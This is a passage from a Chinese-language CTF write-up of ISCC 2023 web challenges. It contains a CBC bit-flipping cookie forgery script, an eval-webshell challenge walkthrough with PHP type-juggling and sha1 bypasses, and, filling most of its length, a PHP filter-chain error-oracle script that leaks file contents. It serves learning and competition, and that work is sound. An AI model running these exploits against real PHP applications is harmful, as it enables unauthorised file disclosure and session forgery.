iv_raw<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>apos;Jh5f1efA<span class="hljs-operator">%</span><span class="hljs-number">2</span>FP0aK4Ja5q6<span class="hljs-operator">%</span><span class="hljs-number">2</span>Flg<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">%</span><span class="hljs-number">3</span>D<span class="hljs-operator">&amp;</span>apos;  #这里填写第一次返回的iv值
cipher_raw<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>apos;YKdGRbYAyVv8G6sI5nTWyTfXFQHzVvdf4DjoLGO3DwKdXf<span class="hljs-operator">%</span><span class="hljs-number">2</span>FSjYwFrl4xX9DhpyRb82wrxFam4nYvKjtClYr58eiz<span class="hljs-operator">%</span><span class="hljs-number">2</span>BBW19RHESbDTz8fA2Y6Ffez4YxW788<span class="hljs-operator">%</span><span class="hljs-number">2</span>BeDRi6OyZ<span class="hljs-operator">%</span><span class="hljs-number">2</span>B<span class="hljs-operator">&amp;</span>apos;  #这里填写第一次返回的cipher值
print (&quot;[*]原始iv和cipher&quot;)
print (&quot;iv_raw:  &quot; <span class="hljs-operator">+</span> iv_raw)
print (&quot;cipher_raw:  &quot; <span class="hljs-operator">+</span> cipher_raw)
print (&quot;[*]对cipher解码，进行反转&quot;)
cipher <span class="hljs-operator">=</span> base64.b64decode(urllib.parse.unquote(cipher_raw))
#a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:&quot;deppartm&quot;;s:<span class="hljs-number">7</span>:&quot;orgnize&quot;;s:<span class="hljs-number">8</span>:&quot;username&quot;;s:<span class="hljs-number">3</span>:&quot;123&quot;;s:<span class="hljs-number">8</span>:&quot;password&quot;;s:<span class="hljs-number">3</span>:&quot;123&quot;;&#125;
#a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:&quot;deppar
#tm&quot;;s:<span class="hljs-number">7</span>:&quot;orgnize
#&quot;;s:<span class="hljs-number">8</span>:&quot;username&quot;
#;s:<span class="hljs-number">3</span>:&quot;123&quot;;s:<span class="hljs-number">8</span>:&quot;
#password&quot;;s:<span class="hljs-number">3</span>:&quot;1
#23&quot;;&#125;
xor_cipher <span class="hljs-operator">=</span> cipher[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]<span class="hljs-operator">+</span>bytes([ord(chr(cipher[<span class="hljs-number">9</span>]))<span class="hljs-operator">^</span>ord(<span class="hljs-operator">&amp;</span>apos;T<span class="hljs-operator">&amp;</span>apos;)<span class="hljs-operator">^</span>ord(<span class="hljs-operator">&amp;</span>apos;t<span class="hljs-operator">&amp;</span>apos;)])<span class="hljs-operator">+</span>cipher[<span class="hljs-number">10</span>:]
#xor_cipher2<span class="hljs-operator">=</span>cipher[<span class="hljs-number">0</span>:<span class="hljs-number">25</span>]<span class="hljs-operator">+</span> chr(ord(cipher[<span class="hljs-number">25</span>]) <span class="hljs-operator">^</span> ord(<span class="hljs-operator">&amp;</span>apos;z<span class="hljs-operator">&amp;</span>apos;) <span class="hljs-operator">^</span> ord(<span class="hljs-operator">&amp;</span>apos;a<span class="hljs-operator">&amp;</span>apos;)) <span class="hljs-operator">+</span> cipher[<span class="hljs-number">25</span>:] #如果修改的是第三密文组，要对前一个密文修改
#print(xor_cipher)
xor_cipher<span class="hljs-operator">=</span>urllib.parse.quote(base64.b64encode(xor_cipher))
print (&quot;反转后的cipher：&quot; <span class="hljs-operator">+</span> xor_cipher)</code></pre>
<p>反转之后利用php脚本重新算一下偏移</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-comment">#计算iv</span>
    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(&amp;apos;txkvKlgRty+WzPGCJ8aK4XRtIjtzOjU6InRlY2huIjtzOjg6InVzZXJuYW1lIjtzOjM6IjEyMyI7czo4OiJwYXNzd29yZCI7czozOiIxMjMiO30=&amp;apos;);    <span class="hljs-comment">//这里放burp放回的base64数据</span>
    <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(&amp;apos;Jh5f1efA%<span class="hljs-number">2</span>FP0aK4Ja5q6%<span class="hljs-number">2</span>Flg%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D&amp;apos;)); <span class="hljs-comment">//这里放cookie中的iv</span>
    <span class="hljs-variable">$plaintext</span> = &amp;apos;a:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;deppar&amp;apos;;</span>
<span class="hljs-string">    <span class="hljs-subst">$new_iv</span> = &amp;apos;&amp;apos;;</span>
<span class="hljs-string">    for (<span class="hljs-subst">$i</span> = 0; <span class="hljs-subst">$i</span> &lt; 16; <span class="hljs-subst">$i</span> ++)&#123;</span>
<span class="hljs-string">        <span class="hljs-subst">$new_iv</span> = <span class="hljs-subst">$new_iv</span> . chr(ord(<span class="hljs-subst">$iv</span>[<span class="hljs-subst">$i</span>]) ^ ord(<span class="hljs-subst">$res</span>[<span class="hljs-subst">$i</span>]) ^ ord(<span class="hljs-subst">$plaintext</span>[<span class="hljs-subst">$i</span>]));  //产生新的向量IV</span>
<span class="hljs-string">    &#125;</span>
<span class="hljs-string">    echo urlencode(base64_encode(<span class="hljs-subst">$new_iv</span>));</span>
<span class="hljs-string">?&gt;</span>
<span class="hljs-string"></span></code></pre>
<p>成功利用自己注册的账号进入策划部，发现有个admin/admin，存在条件竞争漏洞。利用上面的cbc绕过，然后两个号同时给彼此任免，可以提高level，利用bp抓包进行条件竞争，攒够100000之后购买flag即可得到flag</p>
<h2 id="智力王"><a href="#智力王" class="headerlink" title="智力王"></a>智力王</h2><p>扫描目录得到源码，发现有hint，去访问上面提示key为4位，又参考源码中hint部分有对level传值，先尝试去爆破下密钥<br><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br><img src="https://img-blog.csdnimg.cn/302741e44a25424b914b42475e911ffc.png" alt="在这里插入图片描述"><br>那么构造session<br>根据提示，行百里者半九十<br>赠元发弟放言 - 百度汉语<br>作者：黄庭坚<br>亏功一篑，未成丘山。凿井九阶，不次水泽。行百里者半九十，小狐汔济濡其尾。故曰时乎，时不再来。终终始始，是谓君子。<br>去90关，发现ssrf的入口，服务器上构造302页面，通过日志分析，ssrfprotect函数应该是有两次请求，第一次为检测，第二次才是真正请求(共三次)，脚本如下：<br><img src="https://img-blog.csdnimg.cn/92c840d344da4b6b9a70e268c7bf6824.png" alt="在这里插入图片描述"><br>最后格式化字符串得到flag</p>
<h2 id="蚁键连接"><a href="#蚁键连接" class="headerlink" title="蚁键连接"></a>蚁键连接</h2><p>##第0层<br>访问<a href="http://47.94.14.162:10011/">http://47.94.14.162:10011/</a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(&amp;apos;waf.php&amp;apos;);
@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>访问<a href="http://47.94.14.162:10011/waf.php">http://47.94.14.162:10011/waf.php</a><br>跳转到<br><a href="https://www.bilibili.com/video/BV1GJ411x7h7/?VUE9SVNDQw&amp;t=1&amp;vd_source=a3973ee32c81b12d5f6370e78020d6a5">https://www.bilibili.com/video/BV1GJ411x7h7/?VUE9SVNDQw&amp;t=1&amp;vd_source=a3973ee32c81b12d5f6370e78020d6a5</a><br>对url的参数进行分析，得到</p>
<blockquote>
<p>VUE9SVNDQw -&gt; UA=ISCC</p>
</blockquote>
<p>更改UA，得到IScC_L3vel2.php<br>##第1层<br>访问<a href="http://47.94.14.162:10011/IScC_L3vel2.php">http://47.94.14.162:10011/IScC_L3vel2.php</a></p>
<blockquote>
<p>WELCOME TO 2023ISCC<br>your are in admin</p>
</blockquote>
<p>看起来像是SSTI，其实不是<br>访问<a href="http://47.94.14.162:10011/IScC_L3vel2.php?name=2023ISCC">http://47.94.14.162:10011/IScC_L3vel2.php?name=2023ISCC</a></p>
<blockquote>
<p>WELCOME TO 2023ISCC<br>your are in 2023ISCC<br>W0w you Find me next<br>IsCC_N3xT.php</p>
</blockquote>
<p>##第2层<br>访问<a href="http://47.94.14.162:10011/IsCC_N3xT.php">http://47.94.14.162:10011/IsCC_N3xT.php</a><br>注释中发现隐藏信息，构建base64绕过<br><a href="http://47.94.14.162:10011/IsCC_N3xT.php?s0urc3=&czB1cmMz">http://47.94.14.162:10011/IsCC_N3xT.php?s0urc3=%26czB1cmMz</a><br>即可得到源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span>(&amp;apos;level2.php&amp;apos;);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;]==&amp;apos;s0urc3&amp;apos;)&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;没看见base64？&quot;</span>;
&#125;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;])) &#123;
    <span class="hljs-variable">$s0urc3</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;] != &amp;apos;czB1cmMz&amp;apos;) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;/&quot;</span>,<span class="hljs-variable">$s0urc3</span>))&#123;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;s0urc3&amp;apos;]) == &amp;apos;s0urc3&amp;apos;) &#123;
                <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;喜欢我isccIscciSccisCciscCIsCc1sCc吗&quot;</span>;
            &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(&amp;apos;想这样绕过？门都没有!!&amp;apos;);
        &#125;
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;s0urc3不能czB1cmMz&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;你不准看源码！&quot;</span>;
    &#125;
&#125;

<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;iscc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;Iscc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;iScc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[&amp;apos;isCc&amp;apos;] ?: &amp;apos;&amp;apos;;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[&amp;apos;iscc_iscc.lab&amp;apos;])) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>) === &amp;apos;ISCC!!!&amp;apos;) &#123;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span> != <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$b</span>, <span class="hljs-number">0</span>) === <span class="hljs-number">2023</span>) &#123;
            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: https://iscc.isclab.org.cn/&quot;</span>);
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-variable">$d</span> &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$c</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$d</span>)) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level2</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: https://iscc.isclab.org.cn/&quot;</span>);
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location: https://iscc.isclab.org.cn/&quot;</span>);
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>##第三层<br>访问<a href="http://47.94.14.162:10011/WCr3yPbt0.php">http://47.94.14.162:10011/WCr3yPbt0.php</a><br>直接爆破<br>##第四层<br>访问<a href="http://47.94.14.162:10011/IScC_F1n4l.php">http://47.94.14.162:10011/IScC_F1n4l.php</a><br>python直接计算</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">L</span>(<span class="hljs-params">u</span>):
    <span class="hljs-keyword">return</span> (u-<span class="hljs-number">1</span>)//n

aa = L(<span class="hljs-built_in">pow</span>(c,lam,n**<span class="hljs-number">2</span>))
bb = L(<span class="hljs-built_in">pow</span>(g,lam,n**<span class="hljs-number">2</span>))
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
m = (aa * inverse(bb,n)) % n
<span class="hljs-built_in">print</span>(long_to_bytes(m).decode())</code></pre>
<h2 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h2><p>侧信道指的是在验证密码的过程中，如果验证到了错误的密码，计算机的计算速度与验证到正确密码计算的速度不同，利用这一点在网上找到了关于侧信道的脚本，修改一下运行脚本即可得到flag</p>
<pre><code class="hljs bash"><span class="hljs-comment"># print(f&#x27;&#123;header&#125;|&#123;payload&#125;&#x27;)</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;baseline blowup is &#123;baseline_blowup&#125;&#x27;</span>)
trailer = <span class="hljs-built_in">join</span>(*[blow_up_utf32] * (baseline_blowup - 1))
assert req(f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;trailer&#125;&#x27;</span>) == False
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)
j = [
req(f<span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;</span>),
req(f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up</span>
<span class="hljs-string">_enc&#125;|&#123;trailer&#125;&#x27;</span>),
req(f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|con</span>
<span class="hljs-string">vert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#x27;</span>)
]
<span class="hljs-built_in">print</span>(j)
<span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(j) != 2:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">if</span> j[0] == False:
header = f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span>
<span class="hljs-keyword">elif</span> j[1] == False:
header =
f<span class="hljs-string">&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base6</span>
<span class="hljs-string">4-encode&#x27;</span>
<span class="hljs-keyword">elif</span> j[2] == False:
header = f<span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;j: &#123;j&#125;&#x27;</span>)
<span class="hljs-built_in">print</span>(f<span class="hljs-string">&#x27;header: &#123;header&#125;&#x27;</span>)
<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">Step two:</span>
<span class="hljs-string">Now we have something of the form</span>
<span class="hljs-string">[a-zA-Z0-9 things]==</span>
<span class="hljs-string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span>
<span class="hljs-string">successive characters from the start of the string to access every character. Maybe something like</span>
<span class="hljs-string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span>
<span class="hljs-string">there are filters that *swap* characters:</span>
<span class="hljs-string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span>
<span class="hljs-string">abcdefgh -&gt; badcfehg</span>
<span class="hljs-string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span>
<span class="hljs-string">abcdefgh -&gt; dcbahgfe</span>
<span class="hljs-string">This allows us to access the first four characters of the string. Can we do better? It turns out</span>
<span class="hljs-string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the</span>
<span class="hljs-string">start of</span>
<span class="hljs-string">the string:</span>
<span class="hljs-string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span>
<span class="hljs-string">The idea being that if we now use the r4 gadget, we get something like:</span>
<span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span>
<span class="hljs-string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span>
<span class="hljs-string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span>
<span class="hljs-string">bafedc</span>
<span class="hljs-string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and</span>
<span class="hljs-string">6th</span>
<span class="hljs-string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span>
<span class="hljs-string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span>
<span class="hljs-string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which</span>
<span class="hljs-string">is no</span>
<span class="hljs-string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because</span>
<span class="hljs-string">it</span>
<span class="hljs-string">turns out, if we apply the filter</span>
<span class="hljs-string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|conve</span>
<span class="hljs-string">rt.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span>
<span class="hljs-string">It will turn the == into:</span>
<span class="hljs-string">+---AD0-3D3D+---AD0-3D3D</span>
<span class="hljs-string">And this is magic, because this corrects such that when we apply the</span>
<span class="hljs-string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span>
<span class="hljs-string">Let&#x27;s recap. We have a string like:</span>
<span class="hljs-string">abcdefghij==</span>
<span class="hljs-string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span>
<span class="hljs-string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span>
<span class="hljs-string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span>
<span class="hljs-string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span>
<span class="hljs-string">Apply r4 gadget:</span>
<span class="hljs-string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span>
<span class="hljs-string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span>
<span class="hljs-string">bafedcjihg+0DAD3D3+0DAD3Dw==</span>
<span class="hljs-string">Then apply r4 once more:</span>
<span class="hljs-string">efabijcd0+gh3DAD0+3D3DAD==wD</span>
<span class="hljs-string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span>
<span class="hljs-string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span>
<span class="hljs-string">want, to access all the characters in the string ;)</span>
<span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>
flip =
<span class="hljs-string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|conv</span>
<span class="hljs-string">ert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICO</span>
<span class="hljs-string">DE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span>
r2 = <span class="hljs-string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span>
r4 = <span class="hljs-string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span>
def get_nth(n):
global flip, r2, r4
o = []
chunk = n // 2
<span class="hljs-keyword">if</span> chunk % 2 == 1: o.append(r4)
o.extend([flip, r4] * (chunk // 2))
<span class="hljs-keyword">if</span> (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
<span class="hljs-built_in">return</span> <span class="hljs-built_in">join</span>(*o)
<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">Step 3:</span>
<span class="hljs-string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span>
<span class="hljs-string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span>
<span class="hljs-string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span>
<span class="hljs-string">I just bruteforced every combination of iconv filters to find these.</span>
<span class="hljs-string">Numbers are a bit trickier because iconv doesn&#x27;t tend to touch them.</span>
<span class="hljs-string">In the CTF you coud porbably just guess from there once you have the letters. But if you actually</span>
<span class="hljs-string">want a full leak you can base64 encode a third time and use the first two letters of the resulting</span>
<span class="hljs-string">string to figure out which number it is.</span>
<span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>
rot1 = <span class="hljs-string">&#x27;convert.iconv.437.CP930&#x27;</span>
be =
<span class="hljs-string">&#x27;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-</span>
<span class="hljs-string">encode&#x27;</span>
o = <span class="hljs-string">&#x27;&#x27;</span>
def find_letter(prefix):
<span class="hljs-keyword">if</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># a-f A-F 0-9</span>
<span class="hljs-keyword">if</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># a-e</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (n + 1) + f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;edcba&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># A-E</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (n + 1) +
f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;EDCBA&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CSISO5427CYRILLIC.855|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;*&#x27;</span>
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># f</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;f&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># F</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;F&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># n-s N-S</span>
<span class="hljs-keyword">if</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># n-r</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (n + 1) +
f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># N-R</span>
<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(5):
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|&#x27;</span> + f<span class="hljs-string">&#x27;&#123;rot1&#125;|&#123;be&#125;|&#x27;</span> * (
n + 1) + f<span class="hljs-string">&#x27;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]
<span class="hljs-built_in">break</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># s</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;s&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_in</span>
<span class="hljs-string">f&#125;&#x27;</span>):
<span class="hljs-comment"># S</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;S&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># i j k</span>
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;k&#x27;</span>
<span class="hljs-keyword">elif</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;j&#x27;</span>
<span class="hljs-keyword">elif</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;i&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
